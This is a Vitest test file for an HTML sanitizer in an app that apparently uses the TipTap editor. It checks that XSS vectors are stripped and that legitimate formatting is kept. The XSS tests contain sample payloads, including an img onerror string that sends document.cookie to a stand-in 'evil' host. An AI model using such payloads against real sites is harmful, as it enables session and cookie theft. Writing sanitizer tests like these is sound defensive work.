import { describe, it, expect } from "vitest";
import { sanitizeHtml } from "../app/utils/sanitizeHtml";

describe("sanitizeHtml", () => {
  it("returns empty string for null/undefined/empty", () => {
    expect(sanitizeHtml(null)).toBe("");
    expect(sanitizeHtml(undefined)).toBe("");
    expect(sanitizeHtml("")).toBe("");
  });

  describe("neutralizes XSS", () => {
    it("removes <script> tags", () => {
      const out = sanitizeHtml("<p>hi</p><script>alert(1)</script>");
      expect(out).toContain("hi");
      expect(out.toLowerCase()).not.toContain("<script");
    });

    it("removes inline event handlers (the <img onerror> vector)", () => {
      const out = sanitizeHtml('<img src="x" onerror="fetch(`//evil/${document.cookie}`)">');
      expect(out.toLowerCase()).not.toContain("onerror");
    });

    it("removes javascript: URLs on links", () => {
      const out = sanitizeHtml('<a href="javascript:alert(1)">click</a>');
      expect(out.toLowerCase()).not.toContain("javascript:");
    });

    it("removes <svg onload> and other handler-bearing tags", () => {
      const out = sanitizeHtml('<svg onload="alert(1)"></svg>');
      expect(out.toLowerCase()).not.toContain("onload");
      expect(out.toLowerCase()).not.toContain("<svg");
    });
  });

  describe("preserves legitimate TipTap content", () => {
    it("keeps basic formatting and links", () => {
      const out = sanitizeHtml(
        '<p><strong>bold</strong> <em>i</em> <a href="https://example.com">l</a></p>',
      );
      expect(out).toContain("<strong>");
      expect(out).toContain("<em>");
      expect(out).toContain('href="https://example.com"');
    });

    it("keeps task-list checkboxes (data attributes + input)", () => {
      const html =
        '<ul data-type="taskList"><li data-type="taskItem" data-checked="true"><label><input type="checkbox" checked disabled></label><div><p>task</p></div></li></ul>';
      const out = sanitizeHtml(html);
      expect(out).toContain('data-type="taskList"');
      expect(out).toContain('data-checked="true"');
      expect(out).toContain('type="checkbox"');
    });

    it("keeps images with a relative uploads src", () => {
      const out = sanitizeHtml('<img src="/api/uploads/abc.png" alt="pic">');
      expect(out).toContain('src="/api/uploads/abc.png"');
    });

    it("keeps lists, headings and code", () => {
      const out = sanitizeHtml(
        "<h2>Title</h2><ul><li>one</li></ul><pre><code>x = 1</code></pre>",
      );
      expect(out).toContain("<h2>");
      expect(out).toContain("<li>one</li>");
      expect(out).toContain("<code>");
    });

    it("keeps horizontal rules (StarterKit horizontalRule)", () => {
      expect(sanitizeHtml("<p>a</p><hr><p>b</p>")).toContain("<hr");
    });

    it("keeps emoji nodes (span[data-type=emoji][data-name])", () => {
      const out = sanitizeHtml(
        '<p><span data-type="emoji" data-name="smile">😄</span></p>',
      );
      expect(out).toContain('data-type="emoji"');
      expect(out).toContain('data-name="smile"');
      expect(out).toContain("😄");
    });

    it("keeps an ordered list's custom start", () => {
      expect(sanitizeHtml('<ol start="5"><li>five</li></ol>')).toContain(
        'start="5"',
      );
    });

    it("keeps base64 images (upload fallback inserts data: URIs)", () => {
      const out = sanitizeHtml(
        '<img src="data:image/png;base64,iVBORw0KGgo=" alt="x">',
      );
      expect(out).toContain("data:image/png;base64");
    });
  });
});
